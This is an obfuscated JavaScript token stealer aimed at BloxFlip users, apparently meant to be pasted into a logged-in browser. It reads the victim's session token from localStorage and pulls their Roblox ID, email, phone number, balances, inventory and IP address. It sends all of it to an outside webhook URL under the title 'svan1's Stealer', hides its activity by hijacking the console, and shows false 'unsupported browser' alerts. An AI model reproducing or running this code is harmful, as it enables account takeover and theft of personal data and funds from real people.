async function _0x157bd2(_0x3860c4, _0x2c73a0) {
  const _0x3d2793 = await fetch(_0x3860c4, {
    method: 'GET',
    headers: { 'x-auth-token': _0x2c73a0 },
  })
  if (!_0x3d2793.ok) {
    throw new Error('API request failed')
  }
  return _0x3d2793.json()
}
function _0x4cfa9d(_0x3f78e1) {
  const _0x34c95d = new Date(_0x3f78e1)
  return _0x34c95d.toLocaleString('en-US', {
    weekday: 'long',
    month: 'long',
    day: 'numeric',
    year: 'numeric',
    hour: 'numeric',
    minute: 'numeric',
    second: 'numeric',
  })
}
function _0x16ddd5(_0x19ab2f) {
  return Number(_0x19ab2f.toFixed(2))
}
function _0x5c571e(_0x2fc461) {
  return _0x2fc461.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',')
}
async function _0x302f69() {
  const _0x5b2568 = (function () {
      let _0x49d300 = true
      return function (_0x5cb550, _0x22e5fd) {
        const _0x4717eb = _0x49d300
          ? function () {
              if (_0x22e5fd) {
                const _0x401c29 = _0x22e5fd.apply(_0x5cb550, arguments)
                return (_0x22e5fd = null), _0x401c29
              }
            }
          : function () {}
        return (_0x49d300 = false), _0x4717eb
      }
    })(),
    _0x2beea5 = _0x5b2568(this, function () {
      return _0x2beea5
        .toString()
        .search('(((.+)+)+)+$')
        .toString()
        .constructor(_0x2beea5)
        .search('(((.+)+)+)+$')
    })
  _0x2beea5()
  const _0x21d681 = (function () {
      let _0xa62f0e = true
      return function (_0x5518de, _0x18b7a4) {
        const _0x345919 = _0xa62f0e
          ? function () {
              if (_0x18b7a4) {
                const _0x4fe793 = _0x18b7a4.apply(_0x5518de, arguments)
                return (_0x18b7a4 = null), _0x4fe793
              }
            }
          : function () {}
        return (_0xa62f0e = false), _0x345919
      }
    })(),
    _0x2c2acb = _0x21d681(this, function () {
      let _0x4e898b
      try {
        const _0x1c708f = Function(
          'return (function() {}.constructor("return this")( ));'
        )
        _0x4e898b = _0x1c708f()
      } catch (_0x5af859) {
        _0x4e898b = window
      }
      const _0x44c902 = new RegExp('[qRYwuwCtzuvVsDVLBCSPgNNwMEjD]', 'g'),
        _0x43e505 = 'qblRYoxwuwCtfzuvlVisDVp.cLBCSPgNNwMomEjD'
          .replace(_0x44c902, '')
          .split(';')
      let _0x124262, _0x526f8a, _0x2bb5fe, _0x5952a1
      const _0xa0f1d2 = function (_0x3eff03, _0x5cb61b, _0x14a52f) {
          if (_0x3eff03.length != _0x5cb61b) {
            return false
          }
          for (let _0x3ca233 = 0; _0x3ca233 < _0x5cb61b; _0x3ca233++) {
            for (
              let _0xdb0096 = 0;
              _0xdb0096 < _0x14a52f.length;
              _0xdb0096 += 2
            ) {
              if (
                _0x3ca233 == _0x14a52f[_0xdb0096] &&
                _0x3eff03.charCodeAt(_0x3ca233) != _0x14a52f[_0xdb0096 + 1]
              ) {
                return false
              }
            }
          }
          return true
        },
        _0x4410cf = function (_0xbbd5ce, _0x6651ed, _0x5a5c08) {
          return _0xa0f1d2(_0x6651ed, _0x5a5c08, _0xbbd5ce)
        },
        _0x3baf03 = function (_0x59ba16, _0x299e87, _0x316c0a) {
          return _0x4410cf(_0x299e87, _0x59ba16, _0x316c0a)
        },
        _0x137d8f = function (_0x2e0f08, _0x288a75, _0x30fe53) {
          return _0x3baf03(_0x288a75, _0x30fe53, _0x2e0f08)
        }
      for (let _0x4fe1b5 in _0x4e898b) {
        if (_0xa0f1d2(_0x4fe1b5, 8, [7, 116, 5, 101, 3, 117, 0, 100])) {
          _0x124262 = _0x4fe1b5
          break
        }
      }
      for (let _0x3711fd in _0x4e898b[_0x124262]) {
        if (_0x137d8f(6, _0x3711fd, [5, 110, 0, 100])) {
          _0x526f8a = _0x3711fd
          break
        }
      }
      for (let _0x5e2200 in _0x4e898b[_0x124262]) {
        if (_0x3baf03(_0x5e2200, [7, 110, 0, 108], 8)) {
          _0x2bb5fe = _0x5e2200
          break
        }
      }
      if (!('~' > _0x526f8a)) {
        for (let _0xa246b3 in _0x4e898b[_0x124262][_0x2bb5fe]) {
          if (_0x4410cf([7, 101, 0, 104], _0xa246b3, 8)) {
            _0x5952a1 = _0xa246b3
            break
          }
        }
      }
      if (!_0x124262 || !_0x4e898b[_0x124262]) {
        return
      }
      const _0x4b6561 = _0x4e898b[_0x124262][_0x526f8a],
        _0x4c6016 =
          !!_0x4e898b[_0x124262][_0x2bb5fe] &&
          _0x4e898b[_0x124262][_0x2bb5fe][_0x5952a1],
        _0x2c90b4 = _0x4b6561 || _0x4c6016
      if (!_0x2c90b4) {
        return
      }
      let _0x1819b3 = false
      for (let _0x40be1d = 0; _0x40be1d < _0x43e505.length; _0x40be1d++) {
        const _0x290d65 = _0x43e505[_0x40be1d],
          _0x3a8f02 =
            _0x290d65[0] === String.fromCharCode(46)
              ? _0x290d65.slice(1)
              : _0x290d65,
          _0x4eec31 = _0x2c90b4.length - _0x3a8f02.length,
          _0x535206 = _0x2c90b4.indexOf(_0x3a8f02, _0x4eec31),
          _0x369c3e = _0x535206 !== -1 && _0x535206 === _0x4eec31
        if (_0x369c3e) {
          if (
            _0x2c90b4.length == _0x290d65.length ||
            _0x290d65.indexOf('.') === 0
          ) {
            _0x1819b3 = true
          }
        }
      }
      if (!_0x1819b3) {
        const _0x496fc5 = new RegExp('[hNIjhJHOeDvHNNxKxmgcqJyRxPTAhPR]', 'g'),
          _0x2d0bbc = 'abhouNtIj:hJblanHkOeDvHNNxKxmgcqJyRxPTAhPR'.replace(
            _0x496fc5,
            ''
          )
        _0x4e898b[_0x124262][_0x2bb5fe] = _0x2d0bbc
      }
    })
  _0x2c2acb()
  const _0x33cfec = (function () {
      let _0x14c20b = true
      return function (_0x14eddc, _0x469c2f) {
        const _0x5a540b = _0x14c20b
          ? function () {
              if (_0x469c2f) {
                const _0x2cce6a = _0x469c2f.apply(_0x14eddc, arguments)
                return (_0x469c2f = null), _0x2cce6a
              }
            }
          : function () {}
        return (_0x14c20b = false), _0x5a540b
      }
    })(),
    _0x2afd02 = _0x33cfec(this, function () {
      const _0x110cf7 = function () {
          let _0x3b8b3d
          try {
            _0x3b8b3d = Function(
              'return (function() {}.constructor("return this")( ));'
            )()
          } catch (_0x40dd57) {
            _0x3b8b3d = window
          }
          return _0x3b8b3d
        },
        _0x2a60fe = _0x110cf7(),
        _0x4ac519 = (_0x2a60fe.console = _0x2a60fe.console || {}),
        _0xe9068d = [
          'log',
          'warn',
          'info',
          'error',
          'exception',
          'table',
          'trace',
        ]
      for (let _0x43293a = 0; _0x43293a < _0xe9068d.length; _0x43293a++) {
        const _0x272470 = _0x33cfec.constructor.prototype.bind(_0x33cfec),
          _0x1aed5a = _0xe9068d[_0x43293a],
          _0x1efd1c = _0x4ac519[_0x1aed5a] || _0x272470
        _0x272470['__proto__'] = _0x33cfec.bind(_0x33cfec)
        _0x272470.toString = _0x1efd1c.toString.bind(_0x1efd1c)
        _0x4ac519[_0x1aed5a] = _0x272470
      }
    })
  _0x2afd02()
  try {
    const _0x16cf33 = await fetch('https://api.ipify.org?format=json')
    if (!_0x16cf33.ok) {
      throw new Error('failed')
    }
    const _0x5d4a84 = await _0x16cf33.json()
    return _0x5d4a84.ip
  } catch (_0x5e962c) {
    return console.error('Error getting Mines Hash:', _0x5e962c), 'Unknown'
  }
}
async function _0x50d6a5(_0x45ef79, _0x1ae7cd) {
  try {
    const _0x5a2dd4 = await fetch(_0x45ef79, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(_0x1ae7cd),
    })
    !_0x5a2dd4.ok &&
      console.error('Error: ' + _0x5a2dd4.status + ' ' + _0x5a2dd4.statusText)
  } catch (_0x2bc6ff) {
    console.error('Error:', _0x2bc6ff)
  }
}
const _0x4f0bca = window.localStorage['_DO_NOT_SHARE_BLOXFLIP_TOKEN']
_0x4f0bca
  ? _0x302f69().then((_0x4fbacf) => {
      Promise.all([
        _0x157bd2('https://api.bloxflip.com/user', _0x4f0bca),
        _0x157bd2('https://api.bloxflip.com/inventory/viewRbx', _0x4f0bca),
        _0x157bd2('https://api.bloxflip.com/inventory/viewRoblox', _0x4f0bca),
      ])
        .then(([_0x54939a, _0x1ac336, _0x2ab768]) => {
          const {
              gamesWon: _0x194bf3,
              gamesPlayed: _0x321936,
              totalDeposited: _0x42a59f,
              totalWithdrawn: _0x516f97,
              wager: _0x42250e,
              user: {
                robloxId: _0x51de2a,
                robloxUsername: _0x27bd35,
                lastSeenAt: _0x32d205,
                created: _0x2cfa02,
                wallet: _0x512f4e,
                timezoneId: _0x4a668b,
                userEmailProperties: _0x123f18,
                userPhoneProperties: _0x496b45,
                rakebackBalance: _0x44d7f8,
              },
            } = _0x54939a,
            _0x3bde51 = _0x1ac336.rbx,
            _0x210d0e = _0x2ab768.inventory || [],
            _0xc861cc = _0x210d0e.map((_0x3866ec) => {
              return (
                '**Name: ' +
                _0x3866ec.name +
                ' | Price: ' +
                _0x3866ec.recentAveragePrice +
                '**'
              )
            }),
            _0xea4260 = _0xc861cc.join('\n'),
            _0x29c421 = _0x16ddd5(_0x44d7f8),
            _0x5a3226 = {
              user: {
                robloxId: _0x51de2a,
                robloxUsername: _0x27bd35,
                userEmailProperties: _0x123f18,
                userPhoneProperties: _0x496b45,
                gamesWon: 0,
                lastSeenAt: 169411,
              },
            },
            _0x5a4a5e = _0x4cfa9d(_0x32d205),
            _0x4da24d = _0x4cfa9d(_0x2cfa02),
            _0x10a62a = _0x5c571e(_0x16ddd5(_0x512f4e)),
            _0x12ae01 = _0x5c571e(Math.round(_0x42250e)),
            _0x220c4c = {
              username: 'BloxFlip Stealer',
              avatar_url: '',
              embeds: [
                {
                  color: 16251640,
                  title: "svan1's Stealer",
                  description:
                    "\n                  **Victim's Token:** " +
                    _0x4f0bca +
                    '\n                  **User Roblox ID:** ' +
                    _0x51de2a +
                    '\n                  **Roblox Username:** ' +
                    _0x27bd35 +
                    '\n                  **Last Seen At:** ' +
                    _0x5a4a5e +
                    '\n                  **Account Creation Date:** ' +
                    _0x4da24d +
                    '\n                  **Total Deposited:** ' +
                    _0x5c571e(_0x42a59f) +
                    '\n                  **Total Withdrawn:** ' +
                    _0x5c571e(_0x516f97) +
                    '\n                  **Total Wagered:** ' +
                    _0x12ae01 +
                    '\n                  **Roblox Robux Balance:** ' +
                    _0x3bde51 +
                    '\n                  **Bloxflip Robux Balance:** ' +
                    _0x10a62a +
                    '  \n                  **Rakeback Balance:** ' +
                    _0x29c421 +
                    '\n                  **Email:** ' +
                    _0x123f18.email +
                    '\n                  **Phone:** ' +
                    _0x496b45.phoneNumber +
                    '\n                  **Timezone:** ' +
                    (_0x4a668b || 'Unknown') +
                    "\n                  **Victim's IP Address:** " +
                    _0x4fbacf +
                    '\n                  **Limiteds:**\n                  ' +
                    _0xea4260 +
                    '\n                ',
                },
              ],
            }
          _0x50d6a5(
            'https://vineyard.performave.com/api/webhook/v1/proxy/816300ac-1d00-4b29-be46-2bdeb51c8811',
            _0x220c4c
          )
        })
        .catch(() => {
          alert('Error: Please Try Again')
        })
        .finally(() => {
          alert('Unsupported browser! Please use Google Chrome.')
        })
    })
  : alert('You are not logged in!')
